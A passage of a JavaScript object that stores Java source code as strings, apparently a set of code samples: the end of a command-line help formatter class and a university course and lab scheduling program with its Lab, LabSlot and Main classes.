		     * @param longOptSeparator the separator, typically ' ' or '='.
		     * @since 1.3
		     */
		    public void setLongOptSeparator(String longOptSeparator)
		    {
		        this.longOptSeparator = longOptSeparator;
		    }

		    /**
		     * Returns the separator displayed between a long option and its value.
		     * 
		     * @return the separator
		     * @since 1.3
		     */
		    public String getLongOptSeparator()
		    {
		        return longOptSeparator;
		    }

		    /**
		     * Sets the 'argName'.
		     *
		     * @param name the new value of 'argName'
		     */
		    public void setArgName(String name)
		    {
		        this.defaultArgName = name;
		    }

		    /**
		     * Returns the 'argName'.
		     *
		     * @return the 'argName'
		     */
		    public String getArgName()
		    {
		        return defaultArgName;
		    }

		    /**
		     * Comparator used to sort the options when they output in help text.
		     * Defaults to case-insensitive alphabetical sorting by option key.
		     *
		     * @return the {@link Comparator} currently in use to sort the options
		     * @since 1.2
		     */
		    public Comparator&ltOption&gt getOptionComparator()
		    {
		        return optionComparator;
		    }

		    /**
		     * Set the comparator used to sort the options when they output in help text.
		     * Passing in a null comparator will keep the options in the order they were declared.
		     *
		     * @param comparator the {@link Comparator} to use for sorting the options
		     * @since 1.2
		     */
		    public void setOptionComparator(Comparator&ltOption&gt comparator)
		    {
		        this.optionComparator = comparator;
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.  This method prints help information to
		     * System.out.
		     *
		     * @param cmdLineSyntax the syntax for this application
		     * @param options the Options instance
		     */
		    public void printHelp(String cmdLineSyntax, Options options)
		    {
		        printHelp(getWidth(), cmdLineSyntax, null, options, null, false);
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.  This method prints help information to 
		     * System.out.
		     *
		     * @param cmdLineSyntax the syntax for this application
		     * @param options the Options instance
		     * @param autoUsage whether to print an automatically generated
		     * usage statement
		     */
		    public void printHelp(String cmdLineSyntax, Options options, boolean autoUsage)
		    {
		        printHelp(getWidth(), cmdLineSyntax, null, options, null, autoUsage);
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.  This method prints help information to
		     * System.out.
		     *
		     * @param cmdLineSyntax the syntax for this application
		     * @param header the banner to display at the beginning of the help
		     * @param options the Options instance
		     * @param footer the banner to display at the end of the help
		     */
		    public void printHelp(String cmdLineSyntax, String header, Options options, String footer)
		    {
		        printHelp(cmdLineSyntax, header, options, footer, false);
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.  This method prints help information to 
		     * System.out.
		     *
		     * @param cmdLineSyntax the syntax for this application
		     * @param header the banner to display at the beginning of the help
		     * @param options the Options instance
		     * @param footer the banner to display at the end of the help
		     * @param autoUsage whether to print an automatically generated
		     * usage statement
		     */
		    public void printHelp(String cmdLineSyntax, String header, Options options, String footer, boolean autoUsage)
		    {
		        printHelp(getWidth(), cmdLineSyntax, header, options, footer, autoUsage);
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.  This method prints help information to
		     * System.out.
		     *
		     * @param width the number of characters to be displayed on each line
		     * @param cmdLineSyntax the syntax for this application
		     * @param header the banner to display at the beginning of the help
		     * @param options the Options instance
		     * @param footer the banner to display at the end of the help
		     */
		    public void printHelp(int width, String cmdLineSyntax, String header, Options options, String footer)
		    {
		        printHelp(width, cmdLineSyntax, header, options, footer, false);
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.  This method prints help information to
		     * System.out.
		     *
		     * @param width the number of characters to be displayed on each line
		     * @param cmdLineSyntax the syntax for this application
		     * @param header the banner to display at the beginning of the help
		     * @param options the Options instance
		     * @param footer the banner to display at the end of the help
		     * @param autoUsage whether to print an automatically generated 
		     * usage statement
		     */
		    public void printHelp(int width, String cmdLineSyntax, String header,
		                          Options options, String footer, boolean autoUsage)
		    {
		        PrintWriter pw = new PrintWriter(System.out);

		        printHelp(pw, width, cmdLineSyntax, header, options, getLeftPadding(), getDescPadding(), footer, autoUsage);
		        pw.flush();
		    }

		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.
		     *
		     * @param pw the writer to which the help will be written
		     * @param width the number of characters to be displayed on each line
		     * @param cmdLineSyntax the syntax for this application
		     * @param header the banner to display at the beginning of the help
		     * @param options the Options instance
		     * @param leftPad the number of characters of padding to be prefixed
		     * to each line
		     * @param descPad the number of characters of padding to be prefixed
		     * to each description line
		     * @param footer the banner to display at the end of the help
		     *
		     * @throws IllegalStateException if there is no room to print a line
		     */
		    public void printHelp(PrintWriter pw, int width, String cmdLineSyntax, 
		                          String header, Options options, int leftPad, 
		                          int descPad, String footer)
		    {
		        printHelp(pw, width, cmdLineSyntax, header, options, leftPad, descPad, footer, false);
		    }


		    /**
		     * Print the help for &ltcode&gtoptions&lt/code&gt with the specified
		     * command line syntax.
		     *
		     * @param pw the writer to which the help will be written
		     * @param width the number of characters to be displayed on each line
		     * @param cmdLineSyntax the syntax for this application
		     * @param header the banner to display at the beginning of the help
		     * @param options the Options instance
		     * @param leftPad the number of characters of padding to be prefixed
		     * to each line
		     * @param descPad the number of characters of padding to be prefixed
		     * to each description line
		     * @param footer the banner to display at the end of the help
		     * @param autoUsage whether to print an automatically generated
		     * usage statement
		     *
		     * @throws IllegalStateException if there is no room to print a line
		     */
		    public void printHelp(PrintWriter pw, int width, String cmdLineSyntax,
		                          String header, Options options, int leftPad,
		                          int descPad, String footer, boolean autoUsage)
		    {
		        if (cmdLineSyntax == null || cmdLineSyntax.length() == 0)
		        {
		            throw new IllegalArgumentException("cmdLineSyntax not provided");
		        }

		        if (autoUsage)
		        {
		            printUsage(pw, width, cmdLineSyntax, options);
		        }
		        else
		        {
		            printUsage(pw, width, cmdLineSyntax);
		        }

		        if (header != null && header.trim().length() &gt 0)
		        {
		            printWrapped(pw, width, header);
		        }

		        printOptions(pw, width, options, leftPad, descPad);

		        if (footer != null && footer.trim().length() &gt 0)
		        {
		            printWrapped(pw, width, footer);
		        }
		    }

		    /**
		     * Prints the usage statement for the specified application.
		     *
		     * @param pw The PrintWriter to print the usage statement 
		     * @param width The number of characters to display per line
		     * @param app The application name
		     * @param options The command line Options
		     */
		    public void printUsage(PrintWriter pw, int width, String app, Options options)
		    {
		        // initialise the string buffer
		        StringBuffer buff = new StringBuffer(getSyntaxPrefix()).append(app).append(" ");

		        // create a list for processed option groups
		        Collection&ltOptionGroup&gt processedGroups = new ArrayList&ltOptionGroup&gt();

		        List&ltOption&gt optList = new ArrayList&ltOption&gt(options.getOptions());
		        if (getOptionComparator() != null)
		        {
		            Collections.sort(optList, getOptionComparator());
		        }
		        // iterate over the options
		        for (Iterator&ltOption&gt it = optList.iterator(); it.hasNext();)
		        {
		            // get the next Option
		            Option option = it.next();

		            // check if the option is part of an OptionGroup
		            OptionGroup group = options.getOptionGroup(option);

		            // if the option is part of a group 
		            if (group != null)
		            {
		                // and if the group has not already been processed
		                if (!processedGroups.contains(group))
		                {
		                    // add the group to the processed list
		                    processedGroups.add(group);


		                    // add the usage clause
		                    appendOptionGroup(buff, group);
		                }

		                // otherwise the option was displayed in the group
		                // previously so ignore it.
		            }

		            // if the Option is not part of an OptionGroup
		            else
		            {
		                appendOption(buff, option, option.isRequired());
		            }

		            if (it.hasNext())
		            {
		                buff.append(" ");
		            }
		        }


		        // call printWrapped
		        printWrapped(pw, width, buff.toString().indexOf(' ') + 1, buff.toString());
		    }

		    /**
		     * Appends the usage clause for an OptionGroup to a StringBuffer.  
		     * The clause is wrapped in square brackets if the group is required.
		     * The display of the options is handled by appendOption
		     * @param buff the StringBuffer to append to
		     * @param group the group to append
		     * @see #appendOption(StringBuffer,Option,boolean)
		     */
		    private void appendOptionGroup(StringBuffer buff, OptionGroup group)
		    {
		        if (!group.isRequired())
		        {
		            buff.append("[");
		        }

		        List&ltOption&gt optList = new ArrayList&ltOption&gt(group.getOptions());
		        if (getOptionComparator() != null)
		        {
		            Collections.sort(optList, getOptionComparator());
		        }
		        // for each option in the OptionGroup
		        for (Iterator&ltOption&gt it = optList.iterator(); it.hasNext();)
		        {
		            // whether the option is required or not is handled at group level
		            appendOption(buff, it.next(), true);

		            if (it.hasNext())
		            {
		                buff.append(" | ");
		            }
		        }

		        if (!group.isRequired())
		        {
		            buff.append("]");
		        }
		    }

		    /**
		     * Appends the usage clause for an Option to a StringBuffer.  
		     *
		     * @param buff the StringBuffer to append to
		     * @param option the Option to append
		     * @param required whether the Option is required or not
		     */
		    private void appendOption(StringBuffer buff, Option option, boolean required)
		    {
		        if (!required)
		        {
		            buff.append("[");
		        }

		        if (option.getOpt() != null)
		        {
		            buff.append("-").append(option.getOpt());
		        }
		        else
		        {
		            buff.append("--").append(option.getLongOpt());
		        }
		        
		        // if the Option has a value and a non blank argname
		        if (option.hasArg() && (option.getArgName() == null || option.getArgName().length() != 0))
		        {
		            buff.append(option.getOpt() == null ? longOptSeparator : " ");
		            buff.append("&lt").append(option.getArgName() != null ? option.getArgName() : getArgName()).append("&gt");
		        }
		        
		        // if the Option is not a required option
		        if (!required)
		        {
		            buff.append("]");
		        }
		    }

		    /**
		     * Print the cmdLineSyntax to the specified writer, using the
		     * specified width.
		     *
		     * @param pw The printWriter to write the help to
		     * @param width The number of characters per line for the usage statement.
		     * @param cmdLineSyntax The usage statement.
		     */
		    public void printUsage(PrintWriter pw, int width, String cmdLineSyntax)
		    {
		        int argPos = cmdLineSyntax.indexOf(' ') + 1;

		        printWrapped(pw, width, getSyntaxPrefix().length() + argPos, getSyntaxPrefix() + cmdLineSyntax);
		    }

		    /**
		     * Print the help for the specified Options to the specified writer, 
		     * using the specified width, left padding and description padding.
		     *
		     * @param pw The printWriter to write the help to
		     * @param width The number of characters to display per line
		     * @param options The command line Options
		     * @param leftPad the number of characters of padding to be prefixed
		     * to each line
		     * @param descPad the number of characters of padding to be prefixed
		     * to each description line
		     */
		    public void printOptions(PrintWriter pw, int width, Options options, 
		                             int leftPad, int descPad)
		    {
		        StringBuffer sb = new StringBuffer();

		        renderOptions(sb, width, options, leftPad, descPad);
		        pw.println(sb.toString());
		    }

		    /**
		     * Print the specified text to the specified PrintWriter.
		     *
		     * @param pw The printWriter to write the help to
		     * @param width The number of characters to display per line
		     * @param text The text to be written to the PrintWriter
		     */
		    public void printWrapped(PrintWriter pw, int width, String text)
		    {
		        printWrapped(pw, width, 0, text);
		    }

		    /**
		     * Print the specified text to the specified PrintWriter.
		     *
		     * @param pw The printWriter to write the help to
		     * @param width The number of characters to display per line
		     * @param nextLineTabStop The position on the next line for the first tab.
		     * @param text The text to be written to the PrintWriter
		     */
		    public void printWrapped(PrintWriter pw, int width, int nextLineTabStop, String text)
		    {
		        StringBuffer sb = new StringBuffer(text.length());

		        renderWrappedTextBlock(sb, width, nextLineTabStop, text);
		        pw.println(sb.toString());
		    }

		    // --------------------------------------------------------------- Protected

		    /**
		     * Render the specified Options and return the rendered Options
		     * in a StringBuffer.
		     *
		     * @param sb The StringBuffer to place the rendered Options into.
		     * @param width The number of characters to display per line
		     * @param options The command line Options
		     * @param leftPad the number of characters of padding to be prefixed
		     * to each line
		     * @param descPad the number of characters of padding to be prefixed
		     * to each description line
		     *
		     * @return the StringBuffer with the rendered Options contents.
		     */
		    protected StringBuffer renderOptions(StringBuffer sb, int width, Options options, int leftPad, int descPad)
		    {
		        final String lpad = createPadding(leftPad);
		        final String dpad = createPadding(descPad);

		        // first create list containing only &ltlpad&gt-a,--aaa where 
		        // -a is opt and --aaa is long opt; in parallel look for 
		        // the longest opt string this list will be then used to 
		        // sort options ascending
		        int max = 0;
		        List&ltStringBuffer&gt prefixList = new ArrayList&ltStringBuffer&gt();

		        List&ltOption&gt optList = options.helpOptions();

		        if (getOptionComparator() != null)
		        {
		            Collections.sort(optList, getOptionComparator());
		        }

		        for (Option option : optList)
		        {
		            StringBuffer optBuf = new StringBuffer();

		            if (option.getOpt() == null)
		            {
		                optBuf.append(lpad).append("   ").append(getLongOptPrefix()).append(option.getLongOpt());
		            }
		            else
		            {
		                optBuf.append(lpad).append(getOptPrefix()).append(option.getOpt());

		                if (option.hasLongOpt())
		                {
		                    optBuf.append(',').append(getLongOptPrefix()).append(option.getLongOpt());
		                }
		            }

		            if (option.hasArg())
		            {
		                String argName = option.getArgName();
		                if (argName != null && argName.length() == 0)
		                {
		                    // if the option has a blank argname
		                    optBuf.append(' ');
		                }
		                else
		                {
		                    optBuf.append(option.hasLongOpt() ? longOptSeparator : " ");
		                    optBuf.append("&lt").append(argName != null ? option.getArgName() : getArgName()).append("&gt");
		                }
		            }

		            prefixList.add(optBuf);
		            max = optBuf.length() &gt max ? optBuf.length() : max;
		        }

		        int x = 0;

		        for (Iterator&ltOption&gt it = optList.iterator(); it.hasNext();)
		        {
		            Option option = it.next();
		            StringBuilder optBuf = new StringBuilder(prefixList.get(x++).toString());

		            if (optBuf.length() &lt max)
		            {
		                optBuf.append(createPadding(max - optBuf.length()));
		            }

		            optBuf.append(dpad);

		            int nextLineTabStop = max + descPad;

		            if (option.getDescription() != null)
		            {
		                optBuf.append(option.getDescription());
		            }

		            renderWrappedText(sb, width, nextLineTabStop, optBuf.toString());

		            if (it.hasNext())
		            {
		                sb.append(getNewLine());
		            }
		        }

		        return sb;
		    }

		    /**
		     * Render the specified text and return the rendered Options
		     * in a StringBuffer.
		     *
		     * @param sb The StringBuffer to place the rendered text into.
		     * @param width The number of characters to display per line
		     * @param nextLineTabStop The position on the next line for the first tab.
		     * @param text The text to be rendered.
		     *
		     * @return the StringBuffer with the rendered Options contents.
		     */
		    protected StringBuffer renderWrappedText(StringBuffer sb, int width, 
		                                             int nextLineTabStop, String text)
		    {
		        int pos = findWrapPos(text, width, 0);

		        if (pos == -1)
		        {
		            sb.append(rtrim(text));

		            return sb;
		        }
		        sb.append(rtrim(text.substring(0, pos))).append(getNewLine());

		        if (nextLineTabStop &gt= width)
		        {
		            // stops infinite loop happening
		            nextLineTabStop = 1;
		        }

		        // all following lines must be padded with nextLineTabStop space characters
		        final String padding = createPadding(nextLineTabStop);

		        while (true)
		        {
		            text = padding + text.substring(pos).trim();
		            pos = findWrapPos(text, width, 0);

		            if (pos == -1)
		            {
		                sb.append(text);

		                return sb;
		            }

		            if (text.length() &gt width && pos == nextLineTabStop - 1)
		            {
		                pos = width;
		            }

		            sb.append(rtrim(text.substring(0, pos))).append(getNewLine());
		        }
		    }

		    /**
		     * Render the specified text width a maximum width. This method differs
		     * from renderWrappedText by not removing leading spaces after a new line.
		     *
		     * @param sb The StringBuffer to place the rendered text into.
		     * @param width The number of characters to display per line
		     * @param nextLineTabStop The position on the next line for the first tab.
		     * @param text The text to be rendered.
		     */
		    private Appendable renderWrappedTextBlock(StringBuffer sb, int width, int nextLineTabStop, String text)
		    {
		        try
		        {
		            BufferedReader in = new BufferedReader(new StringReader(text));
		            String line;
		            boolean firstLine = true;
		            while ((line = in.readLine()) != null)
		            {
		                if (!firstLine)
		                {
		                    sb.append(getNewLine());
		                }
		                else
		                {
		                    firstLine = false;
		                }
		                renderWrappedText(sb, width, nextLineTabStop, line);
		            }
		        }
		        catch (IOException e) //NOPMD
		        {
		            // cannot happen
		        }

		        return sb;
		    }

		    /**
		     * Finds the next text wrap position after &ltcode&gtstartPos&lt/code&gt for the
		     * text in &ltcode&gttext&lt/code&gt with the column width &ltcode&gtwidth&lt/code&gt.
		     * The wrap point is the last position before startPos+width having a 
		     * whitespace character (space, \\n, \r). If there is no whitespace character
		     * before startPos+width, it will return startPos+width.
		     *
		     * @param text The text being searched for the wrap position
		     * @param width width of the wrapped text
		     * @param startPos position from which to start the lookup whitespace
		     * character
		     * @return position on which the text must be wrapped or -1 if the wrap
		     * position is at the end of the text
		     */
		    protected int findWrapPos(String text, int width, int startPos)
		    {
		        // the line ends before the max wrap pos or a new line char found
		        int pos = text.indexOf('\\n', startPos);
		        if (pos != -1 && pos &lt= width)
		        {
		            return pos + 1;
		        }

		        pos = text.indexOf('\t', startPos);
		        if (pos != -1 && pos &lt= width)
		        {
		            return pos + 1;
		        }

		        if (startPos + width &gt= text.length())
		        {
		            return -1;
		        }

		        // look for the last whitespace character before startPos+width
		        for (pos = startPos + width; pos &gt= startPos; --pos)
		        {
		            final char c = text.charAt(pos);
		            if (c == ' ' || c == '\\n' || c == '\r')
		            {
		                break;
		            }
		        }

		        // if we found it - just return
		        if (pos &gt startPos)
		        {
		            return pos;
		        }

		        // if we didn't find one, simply chop at startPos+width
		        pos = startPos + width;

		        return pos == text.length() ? -1 : pos;
		    }

		    /**
		     * Return a String of padding of length &ltcode&gtlen&lt/code&gt.
		     *
		     * @param len The length of the String of padding to create.
		     *
		     * @return The String of padding
		     */
		    protected String createPadding(int len)
		    {
		        char[] padding = new char[len];
		        Arrays.fill(padding, ' ');

		        return new String(padding);
		    }

		    /**
		     * Remove the trailing whitespace from the specified String.
		     *
		     * @param s The String to remove the trailing padding from.
		     *
		     * @return The String of without the trailing padding
		     */
		    protected String rtrim(String s)
		    {
		        if (s == null || s.length() == 0)
		        {
		            return s;
		        }

		        int pos = s.length();

		        while (pos &gt 0 && Character.isWhitespace(s.charAt(pos - 1)))
		        {
		            --pos;
		        }

		        return s.substring(0, pos);
		    }

		    // ------------------------------------------------------ Package protected
		    // ---------------------------------------------------------------- Private
		    // ---------------------------------------------------------- Inner classes
		    /**
		     * This class implements the &ltcode&gtComparator&lt/code&gt interface
		     * for comparing Options.
		     */
		    private static class OptionComparator implements Comparator&ltOption&gt, Serializable
		    {
		        /** The serial version UID. */
		        private static final long serialVersionUID = 5305467873966684014L;

		        /**
		         * Compares its two arguments for order. Returns a negative
		         * integer, zero, or a positive integer as the first argument
		         * is less than, equal to, or greater than the second.
		         *
		         * @param opt1 The first Option to be compared.
		         * @param opt2 The second Option to be compared.
		         * @return a negative integer, zero, or a positive integer as
		         *         the first argument is less than, equal to, or greater than the
		         *         second.
		         */
		        public int compare(Option opt1, Option opt2)
		        {
		            return opt1.getKey().compareToIgnoreCase(opt2.getKey());
		        }
		    }

		}`
	},
	ai14: {
		type: 'java',
		code: `
		/* Lab
		* A custom class used to store information about labs
		* Takes a string as input of form: Faculty Course# Lec Lec# TUT Tut# OR Faculty Course# TUT Tut#
		* Contains get methods for all private variables
		 */

		public class Lab {


		    private final String faculty;
		    private final int cnum;
		    private final int lsec;
		    private final int tsec;

		    public Lab(String s){
		        String[] arr = s.split(" ");
		        if(arr.length &gt 4) {
		            int count = 0;
		            for (String st : arr) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr.length - count];
		            int i = 0;
		            for (String st : arr){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr = ndata;
		        }
		        if(arr.length == 6){
		            this.faculty = arr[0].trim();
		            this.cnum = Integer.parseInt(arr[1].trim());
		            this.lsec = Integer.parseInt(arr[3].trim());
		            this.tsec = Integer.parseInt(arr[5].trim());
		        }
		        else if(arr.length == 4){
		            this.faculty = arr[0].trim();
		            this.cnum = Integer.parseInt(arr[1].trim());
		            if(arr[2].trim().equals("TUT") | arr[2].trim().equals("LAB")){
		                this.tsec = Integer.parseInt(arr[3].trim());
		                this.lsec = -1;
		            }
		            else {
		                this.lsec = Integer.parseInt(arr[3].trim());
		                this.tsec = -1;
		            }
		        }
		        else{
		            throw new Error("Lab " + s + " not of correct format. Should be Faculty CourseNum LEC LecNum TUT TutNum OR Faculty CourseNum TUT TutNum");
		        }

		    }

		    public Lab(String faculty, int cnum, int lsec, int tsec){
		        this.faculty = faculty;
		        this.cnum = cnum;
		        this.lsec = lsec;
		        this.tsec = tsec;
		    }
		    public String getFaculty() { return this.faculty; }
		    public int getCourseNum() { return this.cnum; }
		    public int getLecSec() { return this.lsec; }
		    public int getTutSec() { return this.tsec; }
		}`
	},
	ai15: {
		type: 'java',
		code: `
		import java.util.ArrayList;
		import java.util.List;

		/* Lab Slot
		 * A custom class to ease the storing of labs in a data structure
		 * Takes an abstract data type of form: Day StartTime CourseMax CourseMinn
		 * Contains get methods for all private variables
		 */
		public class LabSlot{

		    public final String day;
		    public final String start;
		    public final int max;
		    public final int min;
		    public int count;
		    public List&ltLab&gt labs = new ArrayList&lt&gt();

		    public LabSlot(String day, String start, int max, int min) {
		        this.day = day;
		        this.start = start;
		        this.max = max;
		        this.min = min;
		        this.count = 0;
		    }
		    public LabSlot(String day, String start, int max, int min, Lab l) {
		        this.day = day;
		        this.start = start;
		        this.max = max;
		        this.min = min;
		        this.count = 1;
		        this.labs.add(l);
		    }

		    public String getDay() { return day; }
		    public String getStart() { return start; }
		    public int getMax() { return max; }
		    public int getMin() { return min; }
		    public int getCount() { return count; }
		}`
	},
	ai16: {
		type: 'java',
		code: `
		import org.apache.commons.cli.*;

		import java.io.FileNotFoundException;
		import java.io.PrintWriter;
		import java.util.*;
		public class Main {
		    public static boolean debug = false;
		    public static int best = Integer.MIN_VALUE;
		    public static int pen_coursemin = 1;
		    public static int pen_labmin = 1;
		    public static int pen_notpaired = 1;
		    public static int pen_secdiff = 1;
		    public static int w_minfilled = 1;
		    public static int w_pref = 1;
		    public static int w_pair = 1;
		    public static int w_secdiff = 1;
		    public static void main(String[] args) {
		        Options options = new Options();
		        Option pcm = new Option("pcm","coursepen", true, "Course min penalty");
		        options.addOption(pcm);
		        Option plm = new Option("plm", "labpen", true, "Lab min penalty");
		        options.addOption(plm);
		        Option pnp = new Option("pnp", "pairpen", true, "Not pair penalty");
		        options.addOption(pnp);
		        Option wmf = new Option("wmf", "minweight", true, "Weight of min fill");
		        options.addOption(wmf);
		        Option wpf = new Option("wpf", "prefweight", true, "Weight of preference");
		        options.addOption(wpf);
		        Option wpa = new Option("wpa", "pairweight", true, "Weight of pairs");
		        options.addOption(wpa);
		        Option wsd = new Option("wsd", "secweight", true, "Weight of secdiff");
		        options.addOption(wsd);
		        Option debugo = new Option("d", "debug", false, "DEBUG mode on");
		        options.addOption(debugo);

		        CommandLineParser parser = new DefaultParser();
		        HelpFormatter hf = new HelpFormatter();
		        CommandLine cmd = null;

		        try {
		            cmd = parser.parse(options, args);
		        } catch (ParseException e) {
		            System.out.println(e.getMessage());
		            hf.printHelp("utility-name", options);

		            System.exit(1);
		        }
		        if(cmd.hasOption("pcm"))
		            pen_coursemin = Integer.parseInt(cmd.getOptionValue("pcm"));
		        if(cmd.hasOption("plm"))
		            pen_labmin = Integer.parseInt(cmd.getOptionValue("plm"));
		        if(cmd.hasOption("pnp"))
		            pen_notpaired = Integer.parseInt(cmd.getOptionValue("pnp"));
		        if(cmd.hasOption("wmf"))
		            w_minfilled = Integer.parseInt(cmd.getOptionValue("wmf"));
		        if(cmd.hasOption("wpf"))
		            w_pref = Integer.parseInt(cmd.getOptionValue("wpf"));
		        if(cmd.hasOption("wpa"))
		            w_pair = Integer.parseInt(cmd.getOptionValue("wpa"));
		        if(cmd.hasOption("wsd"))
		            w_secdiff = Integer.parseInt(cmd.getOptionValue("wsd"));
		        if(cmd.hasOption("d")) debug = true;
		        if(args.length == 0){
		            System.out.println("Usage: java Main filename [-arguments] [-options]");
		            System.exit(0);
		        }
		        ParserJ parse = new ParserJ(args[0]);
		        Fact init = new Fact(parse.courseSlotList, parse.labsSlotList, parse.courses, parse.labs);
		        for(Partial p : parse.partials){
		            if(p.getTutSec() == -1){
		                int min = 0;
		                int max = 0;
		                for(CourseSlot cs : parse.courseSlotList){
		                    if(cs.getDay().equals(p.getDay()) & cs.getStart().equals(p.getTime())){
		                        min = cs.getMin();
		                        max = cs.getMax();
		                    }
		                }
		                Course c = new Course(p.getFaculty(), p.getCourseNum(), p.getLecSec());
		                CourseSlot cs = new CourseSlot(p.getDay(), p.getTime(), max, min, c);
		                for(CourseSlot ks : parse.courseSlotList){
		                    if(ks.start.equals(cs.start) && ks.min == cs.min && ks.max == cs.max && ks.day.equals(cs.day)){
		                        ks.count = ks.count + 1;
		                    }
		                }
		                init.assignments.add(new Assignments(c,cs));
		                hasPair(c, cs, parse, init);
		                for(Course k : parse.courses){
		                    if(k.getFaculty().equals(c.getFaculty()) && k.getCourseNum() == c.getCourseNum() && k.getLecSec() == c.getLecSec()) {
		                        init.unassCourse.remove(k);
		                        break;
		                    }

		                }

		            }
		            else if(p.getLecSec() == -1 || (p.getTutSec() == 1 & p.getLecSec() == 1)){
		                int min = 0;
		                int max = 0;
		                for(LabSlot ls : parse.labsSlotList){
		                    if(ls.getDay().equals(p.getDay()) & ls.getStart().equals(p.getTime())){
		                        min = ls.getMin();
		                        max = ls.getMax();
		                    }
		                }
		                Lab c = new Lab(p.getFaculty(), p.getCourseNum(), p.getLecSec(), p.getTutSec());
		                LabSlot ls = new LabSlot(p.getDay(), p.getTime(), max, min, c);
		                for(LabSlot ks : parse.labsSlotList){
		                    if(ks.start.equals(ls.start) && ks.min == ls.min && ks.max == ls.max && ks.day.equals(ls.day)){
		                        ks.count = ks.count + 1;
		                    }
		                }
		                init.assignments.add(new Assignments(c,ls));
		                //hasPair for labs
		                for(Lab k : parse.labs){
		                    if(k.getFaculty().equals(c.getFaculty()) && k.getCourseNum() == c.getCourseNum() && k.getLecSec() == c.getLecSec()) {
		                        init.unassCourse.remove(k);
		                        break;
		                    }

		                }

		            }
		        }

		        List&ltFact&gt sols = assign(init, parse);
		        List&ltFact&gt res = new ArrayList&lt&gt();
		        int best = Integer.MAX_VALUE;
		        for(Fact b : sols){
		            if(constr(b) && !res.contains(b)){
		                res.add(b);
		            }
		        }
		        Fact bestf = null;
		        for(Fact b : res){
		            int t = eval(b);
		            if(t &lt best){
		                best = t;
		                bestf = b;
		            }
		        }
		        String[] result = new String[bestf.assignments.size()];
		        int count = 0;
		        Fact f = sols.get(0);

		            for(Assignments as : f.assignments){
		                String out = "";
		                int g = 0;
		                String gg = "";
		                int j = 0;
		                String jj = "";
		                if(as.course != null && as.lab == null) {
		                    g = as.course.getLecSec();
		                    if(g &lt 10) {
		                        gg = "0"+Integer.toString(g);
		                        out = as.course.getFaculty() + " " + as.course.getCourseNum() + " LEC " +
		                                gg + "          :          " + as.courseSlot.day + " , " + as.courseSlot.start;
		                    }
		                    else {
		                        out = as.course.getFaculty() + " " + as.course.getCourseNum() + " LEC " +
		                                as.course.getLecSec() + "          :          " + as.courseSlot.day + " , " + as.courseSlot.start;
		                    }
		                }
		                else if(as.course == null && as.lab != null) {
		                    g = as.lab.getTutSec();
		                    if (g &lt 10) {
		                        gg = "0" + Integer.toString(g);
		                        out = as.lab.getFaculty() + " " + as.lab.getCourseNum() + " TUT " + gg +
		                                "          :          " + as.labSlot.day + " , " + as.labSlot.start;
		                    } else {
		                        out = as.lab.getFaculty() + " " + as.lab.getCourseNum() + " TUT " + as.lab.getTutSec() +
		                                "          :          " + as.labSlot.day + " , " + as.labSlot.start;
		                    }
		                }
		                /*else if(as.course != null && as.lab != null) {
		                    g = as.course.getLecSec();
		                    j = as.lab.getTutSec();
		                    gg = Integer.toString(g);
		                    jj = Integer.toString(j);
		                    if(g &lt 10) gg = "0"+Integer.toString(g);
		                    if(j &lt 10) jj = "0"+Integer.toString(j);
		                    out = as.course.getFaculty() + " " + as.course.getCourseNum() + " LEC " + gg
		                            + " TUT " + jj + "          :          " + as.;
		                }*/
		                result[count] = out;
		                count++;
		            }
		        PrintWriter pw = null;
		        try {
		            pw = new PrintWriter(parse.name + "RESULTS.txt");
		        } catch (FileNotFoundException e) {
		            e.printStackTrace();
		        }
		        int nullcount = 0;
		        for(String s : result){
		            if(s == null){
		                nullcount++;
		            }
		        }
		        String[] result2 = new String[result.length - nullcount];
		        int j = 0;
		        for(String s : result){
		            if(s == null){
		                continue;
		            }
		            result2[j] = s;
		            j++;
		        }
		        Arrays.sort(result2);
		        for(String s : result2){
		            System.out.println(s);
		            pw.println(s);
		        }
		        pw.close();


		    }
		    public static boolean constr(Fact f){
		        boolean resulty = true;
		        for(CourseSlot cs : f.courseSlotList) {
		            if (cs.max &lt cs.count) {
		                return false;
		            }
		        }
		        for(LabSlot ls : f.labsSlotList) {
		            if (ls.max &lt ls.count) {
		                return false;
		            }
		        }
		        //check all elements of the courses that are assigned then check
		        //if name, number, lecnum equal, then the lab\class cannot be assigned to the same slot
		        //don't have to check the other way because we only do contr on complete facts
		        for(CourseSlot cs : f.courseSlotList) {
		        	String tmp_day = cs.getDay();
		        	String tmp_start = cs.getStart();
		        	String[] time_split = new String[2];
		    		time_split = tmp_start.split(":");
		    		int hr = (Integer.parseInt(time_split[0]));
		    		int min = (Integer.parseInt(time_split[1]));
		    		int count500 = 0;
		    		boolean flag_813 = false;
		    		boolean flag_913 = false;

		        	
		            for (Course course : cs.courses) {
		            	String tmp_faculty = course.getFaculty();
		            	int tmp_cnum = course.getCourseNum();
		            	int tmp_lsec = course.getLecSec();

		        		
		            	if(tmp_faculty.equals("CPSC")) {
		            		if(tmp_day.equals("TU") && tmp_start.equals("11:30")) return false;
		            		if(tmp_lsec == 9 && hr &lt= 17 ) return false;
		            		if(tmp_cnum &gt= 500) {
		            			count500++;
		            		}
		            		if(count500 &gt 1) return false;
		            		if(tmp_cnum == 813) {
		            			flag_813 = true;
		            			if(hr != 18 && min != 00) return false;
		            		}
		            		if(tmp_cnum == 913) {
		            			flag_913 = true;
		            			if(hr != 18 && min != 00) return false;
		            		}
		            		
		            		
		            		
		            	}
		            	
		                for (LabSlot l : f.labsSlotList) {
		                	if (l.getDay().equals(tmp_day) && l.getStart().equals(tmp_start)) {
		                		for(Lab lb : l.labs) {
		                			if(lb.getFaculty().equals(tmp_faculty) && lb.getCourseNum() == tmp_cnum && lb.getLecSec() == tmp_lsec)
		                				return false;
		                		}
		                	}

		                    
		                }
		            }
		        }
		        return true;
		        }

